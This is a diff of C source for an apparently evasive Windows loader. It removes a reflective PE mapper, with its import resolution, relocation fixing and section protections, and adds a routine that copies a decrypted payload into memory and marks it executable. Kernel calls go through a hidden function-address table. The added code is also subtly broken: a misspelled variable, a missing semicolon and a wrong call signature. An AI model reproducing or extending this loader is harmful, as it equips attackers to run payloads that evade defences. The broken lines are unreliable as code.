@@ -81,12 +81,12 @@ void *replacement_memset(void *s, int c, size_t n) {
 
 
 void *replacement_malloc(size_t size) {
-    return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 }
 
 void replacement_free(void *ptr) {
     if (ptr) {
-        ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[10])(ptr, 0, MEM_RELEASE);
+        ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[VIRTUAL_FREE_INDEX])(ptr, 0, MEM_RELEASE);
     }
 }
 
@@ -240,144 +240,17 @@ void decrypt_data(char* src, DWORD size) {
     }
 }
 
-// #include "code_handling.h"
-
-void copy_to_virtual(const char *pe_data, char *image_base){
-    IMAGE_DOS_HEADER* source_pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
-    IMAGE_NT_HEADERS* source_pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + source_pe_dos_header->e_lfanew);
-    IMAGE_SECTION_HEADER* source_sections = (IMAGE_SECTION_HEADER *) (source_pe_nt_header + 1); 
-
-    // First copy the headers
-    replacement_memcpy(image_base, pe_data, source_pe_nt_header->OptionalHeader.SizeOfHeaders);
-    
-    // Now copy each section
-    for(int i = 0; i < source_pe_nt_header->FileHeader.NumberOfSections; i++){
-        // Copy section to BASE + RVA = virtual address
-        char *dest = image_base + source_sections[i].VirtualAddress;
-
-        // Copy raw data or set to 0 if there is none
-        if(source_sections[i].SizeOfRawData > 0){
-            replacement_memcpy(dest, pe_data + source_sections[i].PointerToRawData, source_sections[i].SizeOfRawData);
-        } else {
-            replacement_memset(dest, 0, source_sections[i].Misc.VirtualSize);
-        }
-    }
-}
-
-char *copy_to_pages(const char *pe_data){
-    IMAGE_DOS_HEADER *pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
-    IMAGE_NT_HEADERS *pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + pe_dos_header->e_lfanew);
-
-    char *image_base = ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, pe_nt_header->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    if(image_base == NULL)
-        return NULL;
-
-    copy_to_virtual(pe_data, image_base);
-
-    return image_base;
-}
-
-int load_libraries(in_memory_pe *new_pe){
-    // For each module to import
-    for(int i = 0; new_pe->import_descriptors[i].OriginalFirstThunk != 0; i++){
-        // Get the dll name and import it
-        char *module_name = new_pe->data + new_pe->import_descriptors[i].Name;
-        HMODULE import_module = ((HMODULE (__stdcall *)(const char *)) kernel_library_function_addresses[1])(module_name);
-        if(import_module == NULL)
-            return -1;
-        
-        // IDT and IAT of module
-        IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *) (new_pe->data + new_pe->import_descriptors[i].OriginalFirstThunk);
-        IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *) (new_pe->data + new_pe->import_descriptors[i].FirstThunk);
-
-        // get the address of each function
-        for(int i = 0; lookup_table[i].u1.AddressOfData != 0; i++){
-            void* function_handle = NULL;
-            DWORD lookup_addr = lookup_table[i].u1.AddressOfData;
-            if((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) {
-                // import by name : get the IMAGE_IMPORT_BY_NAME struct
-                IMAGE_IMPORT_BY_NAME* image_import =(IMAGE_IMPORT_BY_NAME*) (new_pe->data + lookup_addr);
-                char* funct_name = (char *) &(image_import->Name);
-                function_handle =((void * (__stdcall *)(HMODULE, const char *)) kernel_library_function_addresses[0])(import_module, funct_name);
-            } else {
-                // import by ordinal, directly
-                function_handle = ((void * (__stdcall *)(HMODULE, const char *)) kernel_library_function_addresses[0])(import_module, (LPSTR) lookup_addr);
-            }
-            
-            if(function_handle == NULL) {
-                return -1;
-            }
-
-            // change the IAT, and put the function address inside.
-            address_table[i].u1.Function = (DWORD) function_handle;
-        }
-    }
-
-    return 0;
-}
-
-void resolve_relocations(in_memory_pe *new_pe){
-    DWORD delta_reloc = ((DWORD) (new_pe->data)) - new_pe->pe_nt_header->OptionalHeader.ImageBase;
-
-    // do this if there is a relocation table and the there is a need to relocate
-    if(new_pe->data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_reloc != 0){
-        // Find the relocation address table
-        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*) (new_pe->data + new_pe->data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-
-        while(p_reloc->VirtualAddress != 0) {
-            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
-            WORD* reloc = (WORD*) (p_reloc + 1);
-            for(int i=0; i<size; ++i) {
-                int type = reloc[i] >> 12;
-                int offset = reloc[i] & 0x0fff;
-                DWORD* change_addr = (DWORD*) (new_pe->data + p_reloc->VirtualAddress + offset);
-
-                // there is only one type used that needs to make a change
-                switch(type){
-                    case IMAGE_REL_BASED_HIGHLOW :
-                        *change_addr += delta_reloc;
-                        break;
-                    default:
-                        break;
-                }
-            }
-
-            // switch to the next relocation block, based on the size
-            p_reloc = (IMAGE_BASE_RELOCATION*) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
-        }        
-    }
-}
-
-int set_protections(in_memory_pe *new_pe){
-    DWORD oldProtect;
-   
-    // Set protection of the headers
-    if((((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[4]) (new_pe->data, new_pe->pe_nt_header->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect)) == 0)
-        return -1;
-    for(int i=0; i<new_pe->pe_nt_header->FileHeader.NumberOfSections; ++i) {
-        char* dest = new_pe->data + new_pe->sections[i].VirtualAddress;
-        DWORD s_perm = new_pe->sections[i].Characteristics;
-        DWORD v_perm = 0; 
-        if(s_perm & IMAGE_SCN_MEM_EXECUTE) {
-            v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
-        } else {
-            v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
-        }
-        if((((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[4]) (dest, new_pe->sections[i].Misc.VirtualSize, v_perm, &oldProtect)) == 0)
-            return -1;
-    }
-
-    return 0;
-}
-
 // Shellcode handling code 
 
 char shellcode_to_execute[] = "";
 DWORD shellcode_to_execute_size = 0;
 
 void *shellcode_handling_load(char *shellcode_to_load, int shellcode_to_load_size){
-    void *reserved_memory = replacement_malloc(shellcode_to_load_size);
+    // Reserve memory, copy contents and change protections
+    void *reserverd_memory = (void *) ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL,(SIZE_T) shellcode_to_load_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     replacement_memcpy(reserved_memory, shellcode_to_load);
+    DWORD oldProtect;
+    (((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[VIRTUAL_PROTECT_INDEX]) ((LPVOID) reserved_memory, (DWORD) shellcode_to_load_size, PAGE_EXECUTE_READ, &oldProtect))
     return reserved_memory;    
 }
 
